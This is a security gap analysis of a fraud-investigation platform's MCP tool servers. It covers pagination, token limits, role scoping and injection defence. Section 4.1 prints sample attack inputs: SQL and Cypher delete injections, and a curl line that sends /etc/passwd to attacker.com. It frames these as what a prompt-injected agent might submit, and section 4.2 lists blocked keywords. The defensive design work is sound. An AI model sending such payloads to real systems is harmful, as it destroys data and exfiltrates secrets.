# Omerta.ai — MCP Architecture Gap Analysis & Tool Evaluation

## 1. Executive Summary

This document presents a rigorous gap analysis and security evaluation of the Model Context Protocol (MCP) infrastructure within Omerta.ai. Across the four registered MCP servers (`transaction_server`, `graph_server`, `risk_server`, `knowledge_server`), 19 tools were audited against enterprise security standards, multi-agent least-privilege requirements, and LLM token efficiency constraints.

The audit identifies key architectural gaps across five main dimensions:
1. **Security & Injection Defense**: Tool adapters lack parameter-level sanitization against prompt injection attacks attempting SQL/Cypher mutations or command injection.
2. **Access Control & Specialist Scoping**: Tools currently execute uniformly regardless of which agent or specialist initiates the call, violating least-privilege principles.
3. **Token Efficiency & Pagination**: Tools rely on optional numeric limits without pagination cursors, standard token bounding, or response metadata envelopes.
4. **Tool Design & Contract Consistency**: Input parameter naming and response structures vary across servers (`items` vs `results`).
5. **Machine-Readable Error Semantics**: Error payloads lack recovery guidance for autonomous LLM self-correction.

---

## 2. Existing Tool Inventory Summary

The Omerta.ai MCP infrastructure currently exposes 19 read-only forensic tools:

- **Transaction Server (6 tools)**: `get_transaction`, `get_account`, `get_account_transactions`, `get_recipient_history`, `get_device_history`, `get_ip_history`.
- **Graph Server (6 tools)**: `get_account_neighbors`, `find_connected_accounts`, `find_shared_devices`, `find_shared_ips`, `find_transaction_paths`, `find_fraud_ring`.
- **Risk Server (4 tools)**: `get_risk_score`, `get_risk_features`, `get_feature_importance`, `get_previous_risk_events`.
- **Knowledge Server (3 tools)**: `search_knowledge`, `get_document`, `get_document_section`.

---

## 3. Detailed Gap Findings

### 3.1 Missing Capabilities

| ID | Finding | Server(s) | Description | Priority |
| :--- | :--- | :--- | :--- | :--- |
| **GAP-01** | Lack of Cursor-Based Pagination | All | Tools that return collections accept `limit: int` but no pagination cursor (`cursor` or `page_token`), making it impossible for agents to deterministically page through historical transactions or large graph clusters without window truncation. | **High** |
| **GAP-02** | Absence of Token Bounding Envelope | All | Responses return full nested Pydantic models. For large transaction histories or complex graph neighborhoods, payloads can exceed 10,000 tokens, degrading agent context windows. | **High** |
| **GAP-03** | Missing Specialist Caller Scoping | All | No caller authorization or role token is inspected at the tool boundary. Any agent can call any tool regardless of whether it aligns with the specialist's assigned domain. | **Critical** |
| **GAP-04** | Missing Input Sanitization Guardrails | All | Tool arguments are passed directly to domain services. While domain services use parameterized queries, the outer MCP layer does not actively validate against adversarial SQL/Cypher mutation keywords or OS shell commands. | **Critical** |

### 3.2 Redundant & Overlapping Capabilities

| ID | Tools Involved | Analysis & Consumer Check | Recommendation | Priority |
| :--- | :--- | :--- | :--- | :--- |
| **RED-01** | `get_account_transactions` vs `get_recipient_history` | `get_account_transactions` retrieves all transactions for an account (originator or beneficiary). `get_recipient_history` retrieves only inbound transfers where the account is the beneficiary. While both are used in AML layering analysis, their schema contracts should be aligned to share the same pagination envelope. | Retain both, but standardize output schema and add clear documentation to prevent agent confusion. | **Low** |
| **RED-02** | `get_account_neighbors` vs `find_connected_accounts` | `get_account_neighbors` returns raw topological node neighbors across all entity types (transactions, devices, IPs). `find_connected_accounts` explicitly isolates counterpart accounts with the underlying connection reason. Both serve distinct graph analysis phases. | Retain both; clarify tool descriptions so agents know to use `find_connected_accounts` for account discovery and `get_account_neighbors` for local topology exploration. | **Medium** |

### 3.3 Tool Design & Contract Weaknesses

#### Naming & Descriptions
- In `mcp_servers/transaction_server/server.py`, descriptions for `get_device_history` and `get_ip_history` do not clarify that these tools return transaction history, whereas the Graph server's `find_shared_devices` returns connected *accounts*. An LLM agent may confuse the two.
- Descriptions should explicitly mention required identifiers, max limits, and security constraints.

#### Schema Inconsistencies
- `TransactionHistory` in `domain/schemas.py` defines `items: list[TransactionSummary]`, `count: int`, `limit: int`, `truncated: bool`.
- `KnowledgeSearchOut` defines `results: list[KnowledgeChunkOut]`, `total_found: int`, `query: str`.
- `ConnectedAccountsOut` defines `connections: list[ConnectedAccount]`, `total_connected: int`.
- **Finding**: Heterogeneous collection keys (`items`, `results`, `connections`) increase LLM parsing complexity. Standardizing pagination and metadata envelopes across tool responses simplifies multi-agent workflows.

#### Error Handling Weaknesses
- Currently, when a domain error occurs (e.g. `NotFoundError`), `_execute` returns `{"error": "NOT_FOUND", ...}`.
- When an unexpected exception occurs, it returns `{"error": "INTERNAL_ERROR", "detail": "unexpected server error"}`.
- **Finding**: The errors lack machine-readable recovery guidance (e.g., `"recovery": "Verify that the transaction ID is correctly formatted and exists in the system before retrying"`). Without recovery instructions, autonomous agents struggle to self-heal.

---

## 4. Security Weaknesses & Attack Surface

### 4.1 Injection Vectors & Mutation Defense
Although the underlying ORM and Neo4j drivers use query parameters, an LLM agent subject to indirect prompt injection could submit malicious payloads such as:
- `transaction_id = "TXN-001; DROP TABLE transactions;--"`
- `account_id = "ACC-1001' MATCH (n) DETACH DELETE n;--"`
- `query = "test $(curl attacker.com/steal?data=$(cat /etc/passwd))"`

Without multi-layered validation at the MCP adapter boundary, these inputs flow into domain services unchecked.

### 4.2 Prohibited Operations Verification
To guarantee the **Strict Read-Only Invariant**, the MCP infrastructure must implement proactive pattern interceptors that reject:
- **SQL Mutations**: `INSERT`, `UPDATE`, `DELETE`, `DROP`, `ALTER`, `TRUNCATE`, `CREATE`, `GRANT`, `REVOKE`.
- **Cypher Mutations**: `CREATE`, `MERGE`, `SET`, `DELETE`, `DETACH`, `REMOVE`, `DROP`.
- **Shell Executions**: Shell meta-characters (`;`, `|`, `&`, `` ` ``, `$()`), path traversal (`../`), and command triggers (`cmd.exe`, `powershell`, `bash`, `sh`).

---

## 5. Priority Classification of Findings

| Classification | Issue | Required Remediation |
| :--- | :--- | :--- |
| **CRITICAL** | Injection defense at MCP boundary | Implement `mcp_servers/common/security.py` with strict regex and token inspection for SQL, Cypher, and shell injection. |
| **CRITICAL** | Specialist authorization & scoping | Implement `mcp_servers/common/specialist_rbac.py` defining role-based least-privilege tool access matrices. |
| **HIGH** | Token bounding & response limits | Implement `mcp_servers/common/token_optimization.py` with hard result clamping (max 100) and token-conscious metadata. |
| **HIGH** | Cursor-based pagination standard | Standardize pagination schemas to support stateless token cursor pagination. |
| **MEDIUM** | Error code standardization & recovery | Standardize domain errors with explicit machine-readable codes (`TRANSACTION_NOT_FOUND`, `INVALID_PAGINATION_CURSOR`, `UNAUTHORIZED_TOOL_ACCESS`) and actionable recovery hints. |
| **LOW** | Tool description refinement | Enhance MCP tool docstrings and descriptions to guide agent tool selection. |

---

## 6. Recommended Action Plan & Implementation Status

1. **Create Shared MCP Common Library (`mcp_servers/common/`)**:
   - `security.py`: Read-only invariant enforcement, SQL/Cypher mutation rejector, shell injection defense, identifier validators.
   - `token_optimization.py`: Bounded result sets, cursor pagination helpers, token budgeting wrappers.
   - `specialist_rbac.py`: Specialist caller mapping, tool permission guards, least-privilege matrix.
   - `errors.py`: Standardized machine-readable error envelopes with recovery guidance.
2. **Harden Tool Implementations**:
   - Update `mcp_servers/*/tools.py` and `server.py` to route through the security and token optimization guards.
3. **Automate Comprehensive Validation**:
   - Write automated pytest suites in `tests/mcp/` covering all 9 required test areas.
4. **Generate MCP Documentation Suite**:
   - Deliver `MCP_TOOL_CATALOG.md`, `MCP_SECURITY_MODEL.md`, and `MCP_TOKEN_OPTIMIZATION.md`.

